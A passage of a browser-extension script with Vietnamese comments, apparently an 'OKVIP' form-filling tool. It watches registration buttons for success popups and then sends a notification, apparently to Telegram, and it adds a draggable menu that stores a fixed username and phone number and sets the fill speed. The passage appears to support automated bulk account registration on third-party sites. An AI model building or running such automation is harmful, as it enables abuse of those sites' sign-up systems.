        const txt = b.textContent?.trim() || '';
        if(!/đăng ký phiên bản 1/i.test(txt)) return;
        b.__mk_nrc_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => {
            tries++;
            if(isNrcSuccessVisible()||isNewSuccessVisible()||isOldSuccessVisible()||isMcSuccessVisible()||isDepositPopupSuccessVisible()||isV2SuccessVisible()) {
              clearInterval(poll); doSend();
            }
            if(tries > 40) clearInterval(poll);
          }, 500);
        });
      });
    }

    function attachMcRegisterListener() {
      const mcContainer = document.querySelector('#mc-animate-container');
      if(!mcContainer) return;
      mcContainer.querySelectorAll('button').forEach(b => {
        if(b.__mk_mc_attached__) return;
        const spanText = b.querySelector('span')?.textContent?.trim() || b.textContent?.trim();
        if(!/đăng ký/i.test(spanText)) return;
        b.__mk_mc_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => { tries++; if(isMcSuccessVisible()||isNewSuccessVisible()||isOldSuccessVisible()) { clearInterval(poll); doSend(); } if(tries>30) clearInterval(poll); }, 500);
        });
      });
    }

    let __mk_tg_obs_timer__ = null;
    new MutationObserver(() => {
      if(window.__MK_TG_SENT__) return;
      if(__mk_tg_obs_timer__) return;
      __mk_tg_obs_timer__ = setTimeout(() => {
        __mk_tg_obs_timer__ = null;
        if(window.__MK_TG_SENT__) return;
        if(isOldSuccessVisible()||isNewSuccessVisible()||isMcSuccessVisible()||isDepositPopupSuccessVisible()||isV2SuccessVisible()||isNrcSuccessVisible()) doSend();
      }, 300);
    }).observe(document.body, { childList: true, subtree: true });

    function attachSubmitListener() {
      const submitBtn = document.getElementById('insideRegisterSubmitClick');
      if(!submitBtn || submitBtn.__mk_tg_attached__) return;
      submitBtn.__mk_tg_attached__ = true;
      submitBtn.addEventListener('click', () => {
        if(window.__MK_TG_SENT__) return;
        let tries = 0;
        const poll = setInterval(() => { tries++; if(isNewSuccessVisible()||isOldSuccessVisible()||isMcSuccessVisible()||isV2SuccessVisible()) { clearInterval(poll); doSend(); } if(tries>20) clearInterval(poll); }, 500);
      }, { once: false });
    }

    attachSubmitListener(); attachMcRegisterListener(); attachSubmitBtnListener(); attachV2RegisterListener(); attachNrcRegisterListener();
    let __mk_attach_timer__ = null;
    new MutationObserver(() => {
      if(__mk_attach_timer__) return;
      __mk_attach_timer__ = setTimeout(() => { __mk_attach_timer__ = null; attachSubmitListener(); attachMcRegisterListener(); attachSubmitBtnListener(); attachV2RegisterListener(); attachNrcRegisterListener(); }, 400);
    }).observe(document.body, { childList: true, subtree: true });
  })();

  // =====================================================
  // ========== NÚT TRÒN NỔI (FAB) — KÉO THẢ TỰ DO ==========
  // =====================================================
  (function initFab() {
    if (document.getElementById("__mk_fab__")) return;

    const FAB_POS_KEY = "okvip_fab_pos";
    const SIZE = 52;

    const fab = document.createElement("div");
    fab.id = "__mk_fab__";
    fab.innerHTML = "⚡";
    fab.style.cssText = `
      position:fixed;width:${SIZE}px;height:${SIZE}px;border-radius:50%;
      background:linear-gradient(135deg,#f60,#ff4500);color:#fff;font-size:24px;
      display:flex;align-items:center;justify-content:center;
      box-shadow:0 4px 14px rgba(0,0,0,0.35);z-index:2147483647;
      cursor:grab;touch-action:none;user-select:none;-webkit-user-select:none;
      transition:transform .15s;
    `;

    // ── Vị trí mặc định / khôi phục vị trí đã lưu ──
    function clampPos(x, y) {
      const maxX = window.innerWidth  - SIZE - 6;
      const maxY = window.innerHeight - SIZE - 6;
      return { x: Math.min(Math.max(6, x), Math.max(6, maxX)), y: Math.min(Math.max(6, y), Math.max(6, maxY)) };
    }
    function savePos(x, y) {
      try { localStorage.setItem(FAB_POS_KEY, JSON.stringify({ x, y })); } catch(e) {}
    }
    function loadPos() {
      try {
        const raw = localStorage.getItem(FAB_POS_KEY);
        if (raw) return JSON.parse(raw);
      } catch(e) {}
      return null;
    }
    let saved = loadPos();
    let pos = saved ? clampPos(saved.x, saved.y) : clampPos(window.innerWidth - SIZE - 16, window.innerHeight - SIZE - 110);
    fab.style.left = pos.x + "px";
    fab.style.top  = pos.y + "px";

    document.documentElement.appendChild(fab);

    // ── Menu chức năng nhanh ──
    const menu = document.createElement("div");
    menu.id = "__mk_fab_menu__";
    menu.style.cssText = `
      position:fixed;display:none;flex-direction:column;gap:6px;
      background:#1a1a2e;border:1.5px solid #2a2a3e;border-radius:10px;
      padding:10px;box-shadow:0 6px 20px rgba(0,0,0,0.45);z-index:2147483647;
      font-family:-apple-system,Arial,sans-serif;width:210px;
    `;
    document.documentElement.appendChild(menu);

    const INPUT_CSS = "width:100%;padding:7px 9px;background:#0f0f1a;border:1.5px solid #2a2a3e;border-radius:6px;color:#fff;font-size:12px;outline:none;box-sizing:border-box;touch-action:manipulation;";
    const SAVEBTN_CSS = "width:100%;border:none;border-radius:6px;padding:7px 10px;font-size:12px;font-weight:700;color:#fff;cursor:pointer;margin-top:4px;touch-action:manipulation;";
    const LABEL_CSS = "font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#777;margin:6px 0 4px;";

    const SPEED_LEVELS = [
      { v: 1,   label: "Bình thường" },
      { v: 1.5, label: "Nhanh" },
      { v: 2,   label: "Rất nhanh" },
      { v: 3,   label: "Siêu tốc" },
    ];

    function buildMenu() {
      menu.innerHTML = `
        <div style="${LABEL_CSS}margin-top:0;">👤 Tài khoản cứng</div>
        <input id="__mk_fab_user__" type="text" style="${INPUT_CSS}"/>
        <button id="__mk_fab_user_save__" type="button" style="${SAVEBTN_CSS}background:#f60;">💾 Lưu</button>

        <div style="${LABEL_CSS}">📱 SĐT cứng</div>
        <input id="__mk_fab_phone__" type="text" style="${INPUT_CSS}"/>
        <button id="__mk_fab_phone_save__" type="button" style="${SAVEBTN_CSS}background:#8b5cf6;">💾 Lưu</button>

        <div style="height:1px;background:#2a2a3e;margin:8px 0;"></div>
        <div style="${LABEL_CSS}margin-top:0;">⚡ Tốc độ điền</div>
        <div id="__mk_fab_speed__" style="display:flex;flex-wrap:wrap;gap:5px;"></div>
      `;

      const speedBox = menu.querySelector("#__mk_fab_speed__");
      function renderSpeedButtons() {
        speedBox.innerHTML = "";
        SPEED_LEVELS.forEach(lvl => {
          const active = FILL_SPEED === lvl.v;
          const b = document.createElement("button");
          b.type = "button";
          b.textContent = lvl.label;
          b.style.cssText = `
            flex:1 1 auto;min-width:80px;border-radius:6px;padding:7px 6px;font-size:11px;font-weight:700;
            cursor:pointer;touch-action:manipulation;border:1.5px solid ${active ? "#f60" : "#2a2a3e"};
            background:${active ? "#f60" : "#0f0f1a"};color:#fff;
          `;
          b.addEventListener("click", (e) => {
            e.stopPropagation();
            setFillSpeed(lvl.v);
            showToast(`⚡ Tốc độ điền: ${lvl.label}`, "info");
            renderSpeedButtons();
          });
          speedBox.appendChild(b);
        });
      }
      renderSpeedButtons();

      const userInput  = menu.querySelector("#__mk_fab_user__");
      const phoneInput = menu.querySelector("#__mk_fab_phone__");
      userInput.addEventListener("click", (e) => e.stopPropagation());
      phoneInput.addEventListener("click", (e) => e.stopPropagation());
      userInput.addEventListener("pointerdown", (e) => e.stopPropagation());
      phoneInput.addEventListener("pointerdown", (e) => e.stopPropagation());

      menu.querySelector("#__mk_fab_user_save__").addEventListener("click", async (e) => {
        e.stopPropagation();
        const val = userInput.value.trim();
        if (!val) { showToast("⚠️ Nhập tài khoản trước", "error"); return; }
        try { localStorage.setItem("okvip_hard_username", val); } catch(err) {}
        try { chrome.storage.local.set({ okvip_hard_username: val }); } catch(err) {}
        showToast("👤 Đã lưu TK: " + val, "success");
      });

      menu.querySelector("#__mk_fab_phone_save__").addEventListener("click", async (e) => {
        e.stopPropagation();
        const val = phoneInput.value.trim();
        if (!val) { showToast("⚠️ Nhập số điện thoại trước", "error"); return; }
        try { localStorage.setItem("okvip_hard_phone", val); } catch(err) {}
        try { chrome.storage.local.set({ okvip_hard_phone: val }); } catch(err) {}
        showToast("📱 Đã lưu SĐT: " + val, "success");
      });
    }
    buildMenu();

    async function refreshMenuInputs() {
      const userInput  = menu.querySelector("#__mk_fab_user__");
      const phoneInput = menu.querySelector("#__mk_fab_phone__");
      if (userInput)  userInput.value  = await getHardUsername();
      if (phoneInput) phoneInput.value = await getHardPhone();
    }

    function openMenu() {
      const r = fab.getBoundingClientRect();
      menu.style.display = "flex";
      const menuW = 210, menuH = 330;
      let mx = r.left;
      let my = r.top - menuH - 8;
      if (my < 6) my = r.bottom + 8; // không đủ chỗ phía trên -> mở xuống dưới
      if (my + menuH > window.innerHeight - 6) my = Math.max(6, window.innerHeight - menuH - 6);
      if (mx + menuW > window.innerWidth - 6) mx = window.innerWidth - menuW - 6;
      if (mx < 6) mx = 6;
      menu.style.left = mx + "px";
      menu.style.top  = my + "px";
      refreshMenuInputs();
    }
    function closeMenu() { menu.style.display = "none"; }

    document.addEventListener("click", (e) => {
      if (menu.style.display === "flex" && !menu.contains(e.target) && e.target !== fab) closeMenu();
    });

    // ── Kéo thả (Pointer Events, hỗ trợ chuột + cảm ứng) ──
    let dragging = false, moved = false, startX = 0, startY = 0, origX = 0, origY = 0;

    fab.addEventListener("pointerdown", (e) => {
      dragging = true; moved = false;
      startX = e.clientX; startY = e.clientY;
      origX = pos.x; origY = pos.y;
      fab.style.cursor = "grabbing";
      fab.setPointerCapture(e.pointerId);
    });

    fab.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const dx = e.clientX - startX, dy = e.clientY - startY;
      if (Math.abs(dx) > 4 || Math.abs(dy) > 4) moved = true;
      if (!moved) return;
      pos = clampPos(origX + dx, origY + dy);
      fab.style.left = pos.x + "px";
      fab.style.top  = pos.y + "px";
      if (menu.style.display === "flex") closeMenu();
    });

    fab.addEventListener("pointerup", (e) => {
      if (!dragging) return;
      dragging = false;
      fab.style.cursor = "grab";
      try { fab.releasePointerCapture(e.pointerId); } catch(err) {}
      if (moved) { savePos(pos.x, pos.y); return; }
      // Không kéo -> coi như click, mở/đóng menu
      if (menu.style.display === "flex") closeMenu(); else openMenu();
    });

    window.addEventListener("resize", () => {
      pos = clampPos(pos.x, pos.y);
      fab.style.left = pos.x + "px";
      fab.style.top  = pos.y + "px";
    });
  })();

  showToast("✅ Tool đã sẵn sàng!", "success");

  } // đóng function __mk_boot__

})();
